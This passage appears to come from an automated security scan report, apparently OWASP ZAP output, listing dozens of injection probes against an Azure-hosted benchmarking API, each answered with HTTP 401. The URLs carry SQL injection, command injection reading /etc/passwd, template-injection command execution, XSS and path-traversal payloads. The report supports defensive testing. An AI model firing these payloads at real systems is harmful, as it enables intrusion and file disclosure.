  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId%2522+UNION+ALL+select+NULL+--+&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId%2522+WAITFOR+DELAY+%25270%253A0%253A15%2527+--+&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId%2522+where+0+in+%2528select+sleep%252815%2529+%2529+--+&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId%2526cat+%252Fetc%252Fpasswd%2526&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId%2526sleep+15.0%2526&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId%2526timeout+%252FT+15.0&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId%2526type+%2525SYSTEMROOT%2525%255Cwin.ini&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId%2527%2526cat+%252Fetc%252Fpasswd%2526%2527&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId%2527%2526sleep+15.0%2526%2527&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId%2527%2526timeout+%252FT+15.0%2526%2527&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId%2527%2526type+%2525SYSTEMROOT%2525%255Cwin.ini%2526%2527&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId%2527%2528&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId%2527%2529+UNION+ALL+select+NULL+--+&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId%2527%253Bcat+%252Fetc%252Fpasswd%253B%2527&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId%2527%253Bget-help&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId%2527%253Bsleep+15.0%253B%2527&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId%2527%253Bstart-sleep+-s+15.0&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId%2527%257Ctimeout+%252FT+15.0&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId%2527%257Ctype+%2525SYSTEMROOT%2525%255Cwin.ini&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId%2527&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId%2527+%252F+%2522java.lang.Thread.sleep%2522%252815000%2529+%252F+%2527&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId%2527+%252F+%2528SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.1%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.2%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.3%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.4%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.5%2527%2529+from+dual%2529+%252F+%2527&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId%2527+%252F+sleep%252815%2529+%252F+%2527&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId%2527+AND+%25271%2527%253D%25271%2527+--+&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId%2527+AND+%25271%2527%253D%25272%2527+--+&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId%2527+and+0+in+%2528select+sleep%252815%2529+%2529+--+&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId%2527+and+exists+%2528+select+%2522java.lang.Thread.sleep%2522%252815000%2529+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%253D+%2527SYSTEM_COLUMNS%2527+and+COLUMN_NAME+%253D+%2527TABLE_NAME%2527%2529+--+&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId%2527+OR+%25271%2527%253D%25271%2527+--+&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId%2527+UNION+ALL+select+NULL+--+&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId%2527+WAITFOR+DELAY+%25270%253A0%253A15%2527+--+&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId%2527+where+0+in+%2528select+sleep%252815%2529+%2529+--+&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId%2529%2529+%2522+WAITFOR+DELAY+%25270%253A0%253A15%2527+--+&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId%2529%2529+%2527+WAITFOR+DELAY+%25270%253A0%253A15%2527+--+&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId%2529%2529+WAITFOR+DELAY+%25270%253A0%253A15%2527+--+&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId%2529+%2522+WAITFOR+DELAY+%25270%253A0%253A15%2527+--+&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId%2529+%2527+WAITFOR+DELAY+%25270%253A0%253A15%2527+--+&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId%2529+UNION+ALL+select+NULL+--+&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId%2529+WAITFOR+DELAY+%25270%253A0%253A15%2527+%2528&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId%2529+WAITFOR+DELAY+%25270%253A0%253A15%2527+--+&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId%253B&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId%253Bcat+%252Fetc%252Fpasswd%253B&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId%253Bget-help&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId%253Bget-help+%2523&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId%253Bsleep+15.0%253B&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId%253Bstart-sleep+-s+15.0&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId%253Bstart-sleep+-s+15.0+%2523&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId%257Ctimeout+%252FT+15.0&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId%257Ctype+%2525SYSTEMROOT%2525%255Cwin.ini&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=%2522%2527&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=%2522%252Bresponse.write%2528550%252C627*209%252C991%2529%252B%2522&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=%2522%253B+select+%2522java.lang.Thread.sleep%2522%252815000%2529+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%253D+%2527SYSTEM_COLUMNS%2527+and+COLUMN_NAME+%253D+%2527TABLE_NAME%2527+--+&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=%2522%253Bprint%2528chr%2528122%2529.chr%252897%2529.chr%2528112%2529.chr%252895%2529.chr%2528116%2529.chr%2528111%2529.chr%2528107%2529.chr%2528101%2529.chr%2528110%2529%2529%253B%2524var%253D%2522&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=%2522%253E%253C%2521--%2523EXEC+cmd%253D%2522dir+%255C%2522--%253E%253C&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=%2522%253E%253C%2521--%2523EXEC+cmd%253D%2522ls+%252F%2522--%253E%253C&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=%2522&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=%2522case+when+cast%2528pg_sleep%252815.0%2529+as+varchar%2529+%253E+%2527%2527+then+0+else+1+end+--+&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=%2522java.lang.Thread.sleep%2522%252815000%2529&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=%2523%257B%2525x%2528sleep+15%2529%257D&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=%2523%257Bglobal.process.mainModule.require%2528%2527child_process%2527%2529.execSync%2528%2527sleep+15%2527%2529.toString%2528%2529%257D&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=%2523set%2528%2524engine%253D%2522%2522%2529%250A%2523set%2528%2524proc%253D%2524engine.getClass%2528%2529.forName%2528%2522java.lang.Runtime%2522%2529.getRuntime%2528%2529.exec%2528%2522sleep+15%2522%2529%2529%250A%2523set%2528%2524null%253D%2524proc.waitFor%2528%2529%2529%250A%2524%257Bnull%257D&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=%2524%257B%2540print%2528chr%2528122%2529.chr%252897%2529.chr%2528112%2529.chr%252895%2529.chr%2528116%2529.chr%2528111%2529.chr%2528107%2529.chr%2528101%2529.chr%2528110%2529%2529%257D%255C&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=%2524%257B%2540print%2528chr%2528122%2529.chr%252897%2529.chr%2528112%2529.chr%252895%2529.chr%2528116%2529.chr%2528111%2529.chr%2528107%2529.chr%2528101%2529.chr%2528110%2529%2529%257D&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=%2524%257B__import__%2528%2522subprocess%2522%2529.check_output%2528%2522sleep+15%2522%252C+shell%253DTrue%2529%257D&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=%2527%2522%2500%253CscrIpt%253Ealert%25281%2529%253B%253C%252FscRipt%253E&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=%2527%2522%253Cimg+src%253Dx+onerror%253Dprompt%2528%2529%253E&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=%2527%2522%253CscrIpt%253Ealert%25281%2529%253B%253C%252FscRipt%253E&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=%2527%2528&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=%2527%253B+select+%2522java.lang.Thread.sleep%2522%252815000%2529+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%253D+%2527SYSTEM_COLUMNS%2527+and+COLUMN_NAME+%253D+%2527TABLE_NAME%2527+--+&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=%2527%253Bprint%2528chr%2528122%2529.chr%252897%2529.chr%2528112%2529.chr%252895%2529.chr%2528116%2529.chr%2528111%2529.chr%2528107%2529.chr%2528101%2529.chr%2528110%2529%2529%253B%2524var%253D%2527&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=%2527&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=%2527case+when+cast%2528pg_sleep%252815.0%2529+as+varchar%2529+%253E+%2527%2527+then+0+else+1+end+--+&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=%2528SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.1%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.2%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.3%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.4%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.5%2527%2529+from+dual%2529&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=%2529%253B+select+%2522java.lang.Thread.sleep%2522%252815000%2529+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%253D+%2527SYSTEM_COLUMNS%2527+and+COLUMN_NAME+%253D+%2527TABLE_NAME%2527+--+&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=%252Bresponse.write%2528%257B0%257D*%257B1%257D%2529%252B&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=%252F%252F1498374535918995670.owasp.org&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=%252F&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=%252Fetc%252Fpasswd&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=%252Fuser-data&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=%252FWEB-INF%252Fweb.xml&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=%253B&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=%253B+select+%2522java.lang.Thread.sleep%2522%252815000%2529+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%253D+%2527SYSTEM_COLUMNS%2527+and+COLUMN_NAME+%253D+%2527TABLE_NAME%2527+--+&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
